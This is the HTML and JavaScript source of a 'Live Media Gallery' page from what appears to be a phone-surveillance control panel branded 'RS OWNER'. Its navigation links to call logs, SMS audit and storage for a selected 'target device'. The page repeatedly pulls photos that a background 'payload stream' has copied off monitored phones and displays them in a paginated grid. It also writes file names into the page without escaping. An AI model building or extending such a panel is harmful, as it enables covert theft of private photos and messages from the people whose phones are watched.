<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Media Gallery - RS OWNER</title>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        /* =========================================================
           RS PHONE - ZERO-LAG FLAT ARCHITECTURE (INJECTED STYLE)
           ========================================================= */
        :root {
            --bg-main: #121212;
            --bg-card: #1e1e1e;
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent-cyan: #00f0ff;
            --color-pink: #e91e63;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        body {
            background-color: var(--bg-main);
            color: var(--text-main);
            min-height: 100vh;
            padding: 15px;
            padding-bottom: 40px;
            overflow-x: hidden;
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.1); }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--color-pink); }

        /* Sidebar & Layout */
        .app-container { display: flex; min-height: 100vh; gap: 20px; }
        .sidebar { width: 260px; background: var(--bg-card); padding: 20px; border-radius: 16px; border: 1px solid #2c2c2e; display: flex; flex-direction: column; gap: 25px; }
        .sidebar-brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 800; letter-spacing: 1px; color: var(--text-main); }
        .sidebar-menu { list-style: none; display: flex; flex-direction: column; gap: 8px; }
        .sidebar-menu li a { display: flex; align-items: center; gap: 12px; padding: 12px 16px; color: var(--text-muted); text-decoration: none; border-radius: 8px; font-weight: 600; font-size: 14px; transition: all 0.2s; }
        .sidebar-menu li.active a, .sidebar-menu li a:hover { background: rgba(233, 30, 99, 0.1); color: var(--color-pink); }
        
        .main-content { flex: 1; display: flex; flex-direction: column; gap: 20px; }
        .topbar { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #2c2c2e; }
        .glass-panel { background: var(--bg-card); border: 1px solid #2c2c2e; border-radius: 16px; padding: 25px; }

        /* =========================================================
           GALLERY SPECIFIC STYLES
           ========================================================= */
        #gallery-container {
            max-height: 68vh;
            overflow-y: auto;
            padding-right: 10px;
        }

        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
            gap: 20px;
            padding: 10px 0;
        }
        
        .photo-card {
            background: #1a1a1c;
            border-radius: 12px;
            border: 1px solid #2c2c2e;
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), border-color 0.3s;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .photo-card:hover {
            transform: translateY(-5px);
            border-color: var(--color-pink);
            box-shadow: 0 10px 20px rgba(0,0,0,0.4);
        }

        .view-btn {
            display: block; 
            text-align: center; 
            background: rgba(0, 240, 255, 0.1); 
            color: #00f0ff; 
            padding: 8px; 
            border-radius: 6px; 
            font-size: 12px; 
            text-decoration: none; 
            font-weight: 600; 
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border: 1px solid rgba(0, 240, 255, 0.2);
        }
        .view-btn:hover { background: rgba(0, 240, 255, 0.2); color: #fff; border-color: #00f0ff; }

        /* Pagination Styles */
        .pagination-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid #2c2c2e;
        }
        .pagination-btn {
            background: rgba(233, 30, 99, 0.1);
            color: var(--color-pink);
            border: 1px solid rgba(233, 30, 99, 0.3);
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 0.85rem;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .pagination-btn:hover:not(:disabled) {
            background: rgba(233, 30, 99, 0.3);
            border-color: var(--color-pink);
            color: #fff;
            box-shadow: 0 0 15px rgba(233, 30, 99, 0.3);
        }
        .pagination-btn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
            background: #1a1a1a;
            border-color: #333;
            color: #666;
            box-shadow: none;
        }
        .pagination-indicator {
            font-size: 0.9rem;
            color: #aaa;
            font-weight: bold;
            letter-spacing: 1.5px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- Sidebar Unified Navigation -->
        <div class="sidebar">
            <div class="sidebar-brand">
                <i data-lucide="shield" style="color: var(--color-pink);"></i>
                <span>RS OWNER</span>
            </div>
            <ul class="sidebar-menu">
                <li><a href="/dashboard"><i data-lucide="layout-dashboard"></i> Overview</a></li>
                <li><a href="/communication.html"><i data-lucide="message-circle"></i> Comm Hub</a></li>
                <li class="active"><a href="/remote_center.html"><i data-lucide="cpu"></i> Remote Ops</a></li>
                <li><a href="/calls"><i data-lucide="phone"></i> Call Logs</a></li>
                <li><a href="/messages"><i data-lucide="message-square"></i> SMS Audit</a></li>
                <li><a href="/files"><i data-lucide="folder-open"></i> Storage</a></li>
            </ul>
        </div>
        
        <!-- Main Content Core Viewspace -->
        <main class="main-content">
            <header class="topbar">
                <div>
                    <h2 style="font-weight: 800; letter-spacing: 1px; text-transform: uppercase; color: var(--color-pink);">Rolling Media Gallery</h2>
                    <p style="color: #888; font-size: 0.85rem; margin-top: 4px;">Latest synchronized photos metadata buffer. View actual files on demand.</p>
                </div>
                <div class="device-switcher" style="display: flex; align-items: center; gap: 15px;">
                    <select id="device-select" style="padding: 8px 12px; border-radius: 6px; background: #1e1e1e; color: white; border: 1px solid #333; outline: none; font-weight: 600; cursor: pointer;"></select>
                </div>
            </header>

            <div class="glass-panel">
                <div id="gallery-container">
                    <p style="color: #888; font-style: italic; text-align: center; padding: 40px; font-weight: 500;">Establishing secure connection... Fetching metadata...</p>
                </div>

                <!-- Smart Pagination Controller -->
                <div class="pagination-wrapper">
                    <button class="pagination-btn" id="gallery-prev-btn" disabled>
                        <i data-lucide="arrow-left" style="width: 16px; height: 16px;"></i> Prev
                    </button>
                    <span class="pagination-indicator" id="gallery-page-num">LOADING...</span>
                    <button class="pagination-btn" id="gallery-next-btn" disabled>
                        Next <i data-lucide="arrow-right" style="width: 16px; height: 16px;"></i>
                    </button>
                </div>
            </div>
        </main>
    </div>

    <!-- EMBEDDED JAVASCRIPT LOGIC -->
    <script>
        class GalleryEngine {
            constructor() {
                this.activeDeviceId = localStorage.getItem('active_device_id');
                this.allData = [];
                this.currentPage = 1;
                this.itemsPerPage = 12; 
                this.lastDataHash = "";
                this.init();
            }

            async init() {
                this.setupPaginationListeners();
                await this.loadDevicesList();
                
                const token = localStorage.getItem('owner_token');
                if (!token || !this.activeDeviceId) {
                    const container = document.getElementById('gallery-container');
                    if (container) {
                        container.innerHTML = '<p style="color: #e91e63; text-align: center; padding: 40px; font-weight: 600; font-size: 1.1rem;">Awaiting active hardware target channel synchronization...</p>';
                    }
                    return;
                }

                this.fetchGallery();
                setInterval(() => this.fetchGallery(), 12000);
            }

            // 🚀 INJECTED: Handles Device Select Dropdown Population and Switches
            async loadDevicesList() {
                const token = localStorage.getItem('owner_token');
                try {
                    const res = await fetch('/api/devices', { headers: { 'Authorization': `Bearer ${token}` } });
                    const result = await res.json();
                    if (result.status === 'success') {
                        const selectEl = document.getElementById('device-select');
                        if (selectEl) {
                            selectEl.innerHTML = '';
                            if (!result.data || result.data.length === 0) {
                                selectEl.innerHTML = '<option value="">No Devices Found</option>';
                                return;
                            }
                            result.data.forEach(dev => {
                                const option = document.createElement('option');
                                option.value = dev.id;
                                option.textContent = dev.name;
                                selectEl.appendChild(option);
                            });

                            if (!this.activeDeviceId && result.data.length > 0) {
                                this.activeDeviceId = result.data[0].id;
                                localStorage.setItem('active_device_id', this.activeDeviceId);
                            }
                            selectEl.value = this.activeDeviceId;

                            selectEl.addEventListener('change', (e) => {
                                this.activeDeviceId = e.target.value;
                                localStorage.setItem('active_device_id', this.activeDeviceId);
                                this.currentPage = 1; 
                                this.lastDataHash = ""; 
                                this.fetchGallery();
                            });
                        }
                    }
                } catch (e) { console.error("Device list compilation failure:", e); }
            }

            setupPaginationListeners() {
                const prevBtn = document.getElementById('gallery-prev-btn');
                const nextBtn = document.getElementById('gallery-next-btn');

                if (prevBtn) {
                    prevBtn.addEventListener('click', () => {
                        if (this.currentPage > 1) {
                            this.currentPage--;
                            this.renderCurrentPage();
                        }
                    });
                }

                if (nextBtn) {
                    nextBtn.addEventListener('click', () => {
                        const totalPages = Math.ceil(this.allData.length / this.itemsPerPage) || 1;
                        if (this.currentPage < totalPages) {
                            this.currentPage++;
                            this.renderCurrentPage();
                        }
                    });
                }
            }

            async fetchGallery() {
                const token = localStorage.getItem('owner_token');
                if (!this.activeDeviceId) return;

                try {
                    const res = await fetch(`/api/gallery?device_id=${this.activeDeviceId}`, {
                        headers: { 'Authorization': `Bearer ${token}` }
                    });
                    const result = await res.json();
                    
                    if (result.status === 'success') {
                        const incomingData = result.data || [];
                        const currentDataHash = incomingData.map(p => p.id + "_" + (p.drive_file_id || '')).join("|");
                        
                        if (this.lastDataHash !== currentDataHash) {
                            this.lastDataHash = currentDataHash;
                            this.allData = incomingData;
                            this.renderCurrentPage();
                        }
                    }
                } catch (error) {
                    console.error("Gallery Telemetry Buffer Sync Failure:", error);
                }
            }

            renderCurrentPage() {
                const container = document.getElementById('gallery-container');
                if (!container) return;

                if (this.allData.length === 0) {
                    container.innerHTML = `
                        <div style="text-align: center; color: #888; padding: 80px 20px;">
                            <i data-lucide="image" style="width: 50px; height: 50px; opacity: 0.3; margin-bottom: 15px;"></i>
                            <div style="font-size: 16px; font-weight: 500; color: #ccc;">No photos synchronized from target device yet.</div>
                            <small style="color: #555; display: block; margin-top: 5px;">Awaiting background ContentObserver payload stream...</small>
                        </div>`;
                    if (window.lucide) window.lucide.createIcons();
                    this.updatePaginationUI(1);
                    return;
                }

                container.innerHTML = '<div class="gallery-grid" id="grid"></div>';
                const grid = document.getElementById('grid');

                const startIndex = (this.currentPage - 1) * this.itemsPerPage;
                const endIndex = startIndex + this.itemsPerPage;
                const slicedPhotos = this.allData.slice(startIndex, endIndex);

                slicedPhotos.forEach(photo => {
                    const card = document.createElement('div');
                    card.className = 'photo-card';
                    
                    const dateObj = photo.created_at ? new Date(photo.created_at) : new Date();
                    const dateStr = dateObj.toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric' });
                    const timeStr = dateObj.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });

                    const imageRenderHtml = photo.media_url 
                        ? `<img src="${photo.media_url}" alt="${photo.file_name}" style="width: 100%; height: 160px; object-fit: cover; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05);" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'100\' viewBox=\'0 0 24 24\' fill=\'none\' stroke=\'%23e91e63\' stroke-width=\'1\'><rect x=\'3\' y=\'3\' width=\'18\' height=\'18\' rx=\'2\'/><circle cx=\'8.5\' cy=\'8.5\' r=\'1.5\'/><polyline points=\'21 15 16 10 5 21\'/></svg>'; this.style.opacity='0.4';">`
                        : `<div style="height: 160px; display: flex; align-items: center; justify-content: center; background: #1a1a1a; border-radius: 8px;"><i data-lucide="image" style="width:40px; height:40px; color:#555;"></i></div>`;

                    card.innerHTML = `
                        <div style="background: rgba(255,255,255,0.02); padding: 12px; border-radius: 12px; display: flex; flex-direction: column; justify-content: space-between; height: 100%;">
                            <div>
                                ${imageRenderHtml}
                                <div title="${photo.file_name || 'Asset_Image.jpg'}" style="color: #e0e0e0; font-size: 13px; font-weight: 600; margin-top: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${photo.file_name || 'Asset_Image.jpg'}</div>
                                <div style="font-size: 11px; color: #666; margin-top: 6px; line-height: 1.4; font-family: monospace;">
                                    ${dateStr} • ${timeStr}<br>
                                    Vault: <span style="color: #00f0ff; font-weight: 600; font-family: 'Segoe UI', sans-serif;">G-Drive Proxy</span>
                                </div>
                            </div>
                            <div style="margin-top: 15px;">
                                <a href="${photo.media_url}" target="_blank" class="view-btn"><i data-lucide="external-link" style="width: 14px; height: 14px; display: inline-block; vertical-align: middle; margin-right: 4px;"></i> View Full Scale</a>
                            </div>
                        </div>
                    `;
                    grid.appendChild(card);
                });

                if (window.lucide) window.lucide.createIcons();
                const totalPages = Math.ceil(this.allData.length / this.itemsPerPage) || 1;
                this.updatePaginationUI(totalPages);
            }

            updatePaginationUI(totalPages) {
                const prevBtn = document.getElementById('gallery-prev-btn');
                const nextBtn = document.getElementById('gallery-next-btn');
                const indicator = document.getElementById('gallery-page-num');

                if (this.currentPage > totalPages) {
                    this.currentPage = totalPages;
                }

                if (indicator) {
                    indicator.textContent = `PAGE ${this.currentPage} OF ${totalPages}`;
                }
                if (prevBtn) {
                    prevBtn.disabled = (this.currentPage === 1);
                }
                if (nextBtn) {
                    nextBtn.disabled = (this.currentPage === totalPages);
                }
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            if (window.lucide) window.lucide.createIcons();
            new GalleryEngine();
        });
    </script>
</body>
</html>
